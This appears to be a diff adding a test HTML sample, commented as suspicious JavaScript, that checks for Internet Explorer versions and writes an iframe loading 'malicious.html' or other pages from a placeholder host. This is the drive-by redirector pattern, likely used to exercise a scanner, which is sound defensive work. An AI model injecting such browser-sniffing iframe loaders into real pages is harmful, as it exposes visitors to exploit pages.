@@ -1,0 +1,14 @@
+<html>
+<script>
+//suspicious JS
+if (/MSIE (\d+\.\d+);/.test(navigator.userAgent)){
+ var ieversion=new Number(RegExp.$1)
+ if (ieversion==7)
+  document.write("<iframe src=\"http://example.xmpl/malicious.html\"></iframe>");
+ else
+  document.write("<iframe src=\"http://example.xmpl/ex3.html\"></iframe>");
+}
+else
+ document.write("<iframe src=\"http://example.xmpl/ex4.html\"></iframe>");
+</script>
+</html>
